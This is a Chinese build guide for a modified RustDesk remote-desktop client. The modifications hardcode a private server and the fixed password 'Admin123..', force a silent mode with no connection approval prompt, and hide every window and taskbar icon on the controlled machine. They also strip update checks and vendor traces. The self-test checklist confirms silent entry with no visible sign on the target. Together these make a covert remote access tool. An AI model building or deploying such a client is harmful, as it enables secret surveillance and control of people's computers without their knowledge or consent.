
# 自定义客户端构建说明（duojiedian）

本仓库基于 RustDesk 1.5.9 源码定制，已内联 `libs/*` 子模块、写死自建服务器配置，并做了「静默连接 / 去更新提示 / 去官网痕迹」改造。
按本文档操作即可编译出可用的客户端；配置项无需再手工修改。

---

## 一、已内置的定制项（无需再改代码）

| 项目 | 位置 | 说明 |
| --- | --- | --- |
| ID / 中继服务器 | `libs/hbb_common/src/config.rs` → `RENDEZVOUS_SERVERS` | `linybot.top`、`rust.linybot.top`（21116/21117） |
| 公钥 | `libs/hbb_common/src/config.rs` → `RS_PUB_KEY` | 自建 hbbs/hbbr 的 key |
| API 服务器 | `src/common.rs` → `get_api_server_()` | 未配置自定义 API 时返回 `http://<ID服务器>:21114` |
| 默认固定密码 | `config.rs` / `src/server.rs` | `DEFAULT_PERMANENT_PASSWORD = "Admin123.."` |
| 强制静默模式 | `libs/hbb_common/src/password_security.rs` → `FORCE_SILENT_MODE` | 强制 `approve_mode=Password` + `OnlyUsePermanentPassword`，连接不弹确认窗 |
| 隐藏连接管理窗口 | `hide_cm()` 恒真 / `flutter/lib/main.dart` | 被连接时桌面无窗口、任务栏无图标 |
| 去升级提示 | `src/common.rs` → `check_software_update()` | 直接返回空，不再查更新 |
| 去更新 UI | `flutter/.../desktop_home_page.dart`、`mobile/pages/connection_page.dart`、`desktop_setting_page.dart`、`mobile/pages/settings_page.dart`、`common.dart` | 删除「检查更新」入口与开关 |
| 默认打洞 | `src/common.rs` → `get_local_option()` | `enable-udp-punch`、`enable-ipv6-punch` 空值时返回 `Y` |
| 关 macOS 静默更新 | `src/updater.rs` → `start_auto_update_macos()` | 停用 |
| 去官网/隐私链接 | `desktop_setting_page.dart`、`mobile/pages/settings_page.dart` | 关于页仅保留版本号与 ID/指纹 |
| 去 powered-by | `flutter/lib/common.dart` → `loadPowered()` | 恒返回空组件 |

> 说明：`flutter/lib/generated_bridge.dart` 与 `src/bridge_generated.rs` 未改动，无需重新跑 `flutter_rust_bridge_codegen`。

---

## 二、环境要求

| 工具 | 版本 | 备注 |
| --- | --- | --- |
| Rust | 1.75.0（macOS 需 1.81+） | `rustup toolchain install 1.75.0`；过高版本可能导致 sciter/ABI 问题 |
| Flutter | 3.24.5 | 与 CI 一致；`flutter --version` 对齐 |
| LLVM | 15+ | Windows 需 `LIBCLANG_PATH` 指向 `bin` 目录 |
| vcpkg | commit `9e593bb`（2026.07.29） | Windows 必需，`VCPKG_ROOT` 环境变量 |
| CMake | 4.3.0 | vcpkg 依赖编译用 |
| VS 2022 | 含「使用 C++ 的桌面开发」 | Windows |
| Android NDK | r28c + `cargo-ndk 3.1.2` | 仅安卓；`compileSdk 36`、`minSdk 22` |

---

## 三、Windows（x64，最常见）

```powershell
# 1) 环境变量（示例，路径按实际修改）
$env:VCPKG_ROOT = "C:\vcpkg"
$env:LIBCLANG_PATH = "C:\Program Files\LLVM\bin"

# 2) 首次需安装 vcpkg 依赖（仓库根目录执行）
vcpkg install --triplet x64-windows-static --x-install-root "$PWD\vcpkg_installed"

# 3) 编译 Rust 端
cargo build --release --features flutter,hwcodec

# 4) 编译 Flutter 端（仓库根目录）
python build.py --flutter --skip-cargo --portable

# 产物：flutter\build\windows\x64\runner\Release\ 与 build.py 生成的 zip
```

要点：
- `--skip-cargo` 前提是第 3 步已产出 `target\release\rustdesk.dll`，否则请去掉该参数。
- 若报缺少 `libclang.dll`，确认 `LIBCLANG_PATH` 指向 LLVM 的 `bin`。
- 若报 vcpkg baseline 不一致，执行 `vcpkg x-update-baseline` 后重试。

---

## 四、macOS

```bash
rustup toolchain install 1.81.0 && rustup default 1.81.0
flutter --version   # 确认 3.24.5
python3 build.py --flutter --dmg
```

- arm64 机器需 Flutter 3.44.9（CI 同款），x86_64 用 3.24.5。
- 首次运行需在「系统设置 → 隐私与安全性」授予屏幕录制、辅助功能、输入监控权限，否则画面黑屏/无法控制。
- 未签名分发会触发 Gatekeeper，测试用 `xattr -dr com.apple.quarantine /Applications/RustDesk.app`。

---

## 五、Linux

```bash
sudo apt install -y libgtk-3-dev libxcb-randr0-dev libxdo-dev libxfixes-dev \
  libxcb-shape0-dev libxcb-xfixes0-dev libasound2-dev libpulse-dev libudev-dev \
  libva-dev libvdpau-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev
python3 build.py --flutter --deb
```

Debian 12 可直接编译；Wayland 下如需远程控制请输入会话时选用 X11，或在登录界面安装 `x11` 会话。

---

## 六、Android

```bash
export ANDROID_NDK_HOME=/path/to/ndk/r28c
cargo install cargo-ndk --version 3.1.2 --locked
cd flutter && flutter build apk --release
```

- `flutter/android/app/build.gradle` 的 `minSdkVersion 22`，低于此版本设备无法安装。
- 若签名需求，请自备 `key.properties` 与 keystore，未配置时使用调试签名。
- 如需静默被控（无障碍/录屏授权），首次启动仍需用户在系统弹窗中手动授予一次。

---

## 七、验证清单（编译后自测）

1. 客户端 ID 页显示的服务器为自建服务器地址（非 `rs-ny.rustdesk.com`）。
2. 用另一台设备连接该 ID，输入 `Admin123..` 应直接进入，无「接受/拒绝」确认框。
3. 被控端任务栏与桌面均无窗口、无图标。
4. 设置/关于页无「检查更新」「官网」「隐私声明」入口。
5. 路由器无端口映射时，UDP 打洞默认生效（可从日志 `rendezvous` 段确认）。

---

## 八、常见问题

| 现象 | 原因 / 处理 |
| --- | --- |
| 编译报 `hbb_common` 找不到 | 子模块已内联，确认使用本仓库而非上游；不要执行 `git submodule update` |
| 连接后黑屏 | 目标机未授予屏幕录制（macOS）/ 未安装 X11 会话（Linux） |
| 连接仍弹确认框 | 检查 `FORCE_SILENT_MODE` 是否为 `true`，且编译产物为本次源码 |
| 服务器连不通 | `linybot.top:21115-21119` TCP/UDP 需在防火墙与安全组放通；`21114` 用于 API |
| 想恢复更新提示 | 还原 `check_software_update()` 与各 Flutter 页面的 commit 即可（见 git log） |
